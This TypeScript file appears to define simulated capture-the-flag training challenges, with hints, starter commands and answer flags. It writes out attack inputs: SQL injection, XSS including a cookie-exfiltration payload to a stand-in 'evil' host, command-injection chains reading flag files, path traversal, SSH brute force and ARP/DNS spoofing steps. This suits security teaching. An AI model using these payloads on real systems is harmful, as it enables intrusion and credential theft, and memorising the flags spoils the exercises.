export type Category =
  | "SQLI" | "XSS" | "CMDI" | "TRAVERSAL" | "BRUTE_FORCE" | "SESSION_HIJACKING" | "SPOOFING" | "CRYPTO";
export type Difficulty = "BEGINNER" | "INTERMEDIATE" | "ADVANCED";

export interface Challenge {
  slug: string;
  title: string;
  category: Category;
  difficulty: Difficulty;
  brief: string;
  intro: string[];
  engine: string;
  params: Record<string, any>;
  hint: string;
  starters: string[];
  flag: string;
}

export const CHALLENGES: Challenge[] = [
  {
    slug: "sqli-login-bypass",
    title: "Auth Bypass",
    category: "SQLI",
    difficulty: "BEGINNER",
    brief: "El portal de Acme concatena tu input en la query. Entra como admin sin conocer la contraseña.",
    intro: ["objetivo: evitar la autenticación del portal", "comandos: target · login <user> :: <pass>"],
    engine: "sqli",
    params: { mode: "bypass" },
    hint: "Inyecta una tautología comentando el resto:  admin' OR '1'='1' --",
    starters: ["target", "login admin' OR '1'='1' -- :: x"],
    flag: "MHB{4uth_bypass3d}"
  },
  {
    slug: "sqli-union-dump",
    title: "Union Dump",
    category: "SQLI",
    difficulty: "INTERMEDIATE",
    brief: "No basta con entrar: vuelca la tabla users completa mediante un ataque UNION.",
    intro: ["objetivo: exfiltrar todas las filas de la tabla users", "comandos: login <user> :: <pass>"],
    engine: "sqli",
    params: { mode: "dump" },
    hint: "login ' UNION SELECT username,password,role FROM users -- :: x",
    starters: ["login ' UNION SELECT username,password,role FROM users -- :: x"],
    flag: "MHB{un10n_l33t_dump}"
  },
  {
    slug: "xss-reflected-alert",
    title: "Reflected Alert",
    category: "XSS",
    difficulty: "BEGINNER",
    brief: "El campo de comentarios se refleja sin sanitizar. Ejecuta JavaScript en la página.",
    intro: ["objetivo: disparar un alert() en el navegador de la víctima", "comando: payload <html>"],
    engine: "xss",
    params: { mode: "alert" },
    hint: "payload <script>alert(1)</script>  (o  <img src=x onerror=alert(1)>)",
    starters: ["payload <script>alert(1)</script>", "payload <img src=x onerror=alert(1)>"],
    flag: "MHB{p0p_p0p_alert}"
  },
  {
    slug: "xss-cookie-steal",
    title: "Cookie Stealer",
    category: "XSS",
    difficulty: "INTERMEDIATE",
    brief: "Una alerta no vale. Exfiltra la cookie de sesión de la víctima a tu servidor.",
    intro: ["objetivo: robar document.cookie vía XSS", "comando: payload <html>"],
    engine: "xss",
    params: { mode: "cookie" },
    hint: "payload <img src=x onerror=\"new Image().src='//tu.srv/?c='+document.cookie\">",
    starters: ["payload <img src=x onerror=\"new Image().src='//evil/?c='+document.cookie\">"],
    flag: "MHB{c00k13_j4ck3d}"
  },
  {
    slug: "cmdi-ping",
    title: "Ping of Death",
    category: "CMDI",
    difficulty: "BEGINNER",
    brief: "El diagnóstico de red pasa tu host a la shell del sistema. Léete flag.txt.",
    intro: ["objetivo: leer flag.txt del servidor", "comando: ping <host>"],
    engine: "cmdi",
    params: { file: "flag.txt", contents: "MHB{sh3ll_1nj3ct10n}" },
    hint: "Encadena un comando:  ping 127.0.0.1; cat flag.txt",
    starters: ["ping 127.0.0.1; cat flag.txt", "ping 8.8.8.8 && cat flag.txt"],
    flag: "MHB{sh3ll_1nj3ct10n}"
  },
  {
    slug: "cmdi-root",
    title: "Root RCE",
    category: "CMDI",
    difficulty: "ADVANCED",
    brief: "El servicio corre como root. Encadena comandos y lee root.flag.",
    intro: ["objetivo: leer root.flag (privilegios root)", "comando: ping <host>"],
    engine: "cmdi",
    params: { file: "root.flag", contents: "MHB{r00t_rc3_pwn}" },
    hint: "ping localhost | cat root.flag",
    starters: ["ping localhost | cat root.flag"],
    flag: "MHB{r00t_rc3_pwn}"
  },
  {
    slug: "traversal-config",
    title: "Escape the Web Root",
    category: "TRAVERSAL",
    difficulty: "BEGINNER",
    brief: "La descarga de ficheros no valida la ruta. Sal del directorio y lee la config secreta.",
    intro: ["objetivo: leer etc/app/secret.conf saliendo de uploads/", "comando: get <ruta>"],
    engine: "traversal",
    params: { depth: 3, target: "etc/app/secret.conf", contents: "DB_PASS=MHB{p4th_tr4v3rs4l}" },
    hint: "get ../../../etc/app/secret.conf   (prueba también  ....//  si filtran ../)",
    starters: ["get ../../../etc/app/secret.conf"],
    flag: "MHB{p4th_tr4v3rs4l}"
  },
  {
    slug: "brute-weak-login",
    title: "Weak Password",
    category: "BRUTE_FORCE",
    difficulty: "BEGINNER",
    brief: "La cuenta 'operator' usa una contraseña de diccionario. Rómpela.",
    intro: ["objetivo: encontrar la contraseña de 'operator'", "comandos: crack · try <password>"],
    engine: "bruteforce",
    params: { username: "operator", password: "letmein", wordlist: ["123456", "password", "qwerty", "admin", "letmein", "dragon"] },
    hint: "Lanza el diccionario:  crack",
    starters: ["crack"],
    flag: "MHB{w34k_p4ssw0rd}"
  },
  {
    slug: "brute-ssh",
    title: "SSH Bruteforce",
    category: "BRUTE_FORCE",
    difficulty: "INTERMEDIATE",
    brief: "Servidor SSH con root habilitado. Adivina las credenciales por diccionario.",
    intro: ["objetivo: acceso root por SSH", "comandos: crack · try <password>"],
    engine: "bruteforce",
    params: { username: "root", password: "toor", wordlist: ["root", "12345678", "changeme", "toor", "root123"] },
    hint: "crack  ejecuta la lista contra root@target",
    starters: ["crack"],
    flag: "MHB{ssh_brut3f0rc3}"
  },
  {
    slug: "hijack-session",
    title: "Stolen Session",
    category: "SESSION_HIJACKING",
    difficulty: "INTERMEDIATE",
    brief: "La app viaja por HTTP. Intercepta el tráfico, roba el SID de admin y reprodúcelo.",
    intro: ["objetivo: secuestrar la sesión de admin", "comandos: sniff · replay <SID>"],
    engine: "hijack",
    params: { validToken: "a9f3c1e8b7" },
    hint: "sniff  para capturar cookies; luego  replay <el SID de /admin>",
    starters: ["sniff", "replay a9f3c1e8b7"],
    flag: "MHB{s3ss10n_st0l3n}"
  },
  {
    slug: "spoof-dns",
    title: "DNS Spoof MITM",
    category: "SPOOFING",
    difficulty: "ADVANCED",
    brief: "Colócate en medio, falsea el DNS de bank.local y cosecha las credenciales de la víctima.",
    intro: ["objetivo: MITM + DNS spoof para capturar credenciales", "comandos: arpspoof <victima> <gateway> · dnsspoof <dominio> · harvest"],
    engine: "spoofing",
    params: { target: "192.168.1.24", gateway: "192.168.1.1", domain: "bank.local", loot: "MHB{dns_sp00f_mitm}" },
    hint: "1) arpspoof 192.168.1.24 192.168.1.1  2) dnsspoof bank.local  3) harvest",
    starters: ["arpspoof 192.168.1.24 192.168.1.1", "dnsspoof bank.local", "harvest"],
    flag: "MHB{dns_sp00f_mitm}"
  },
  {
    slug: "crypto-b64",
    title: "Base64 Layers",
    category: "CRYPTO",
    difficulty: "BEGINNER",
    brief: "Han interceptado un token codificado. Decodifícalo para leer la flag.",
    intro: ["objetivo: decodificar el token", "comandos: cipher · b64 <texto> · rot13 <texto>"],
    engine: "crypto",
    params: { cipher: "TUhCe2I0czNfNjRfcjN2M3JzM30=" },
    hint: "b64 TUhCe2I0czNfNjRfcjN2M3JzM30=",
    starters: ["cipher", "b64 TUhCe2I0czNfNjRfcjN2M3JzM30="],
    flag: "MHB{b4s3_64_r3v3rs3}"
  },
  {
    slug: "crypto-rot13",
    title: "Rotated Secret",
    category: "CRYPTO",
    difficulty: "INTERMEDIATE",
    brief: "El texto está cifrado con una rotación clásica. Recupéralo.",
    intro: ["objetivo: descifrar la rotación", "comandos: cipher · b64 <texto> · rot13 <texto>"],
    engine: "crypto",
    params: { cipher: "ZUO{e0g4g3_z3}" },
    hint: "rot13 ZUO{e0g4g3_z3}",
    starters: ["cipher", "rot13 ZUO{e0g4g3_z3}"],
    flag: "MHB{r0t4t3_m3}"
  }
];

export const challengeBySlug = (slug: string) => CHALLENGES.find((c) => c.slug === slug) ?? null;
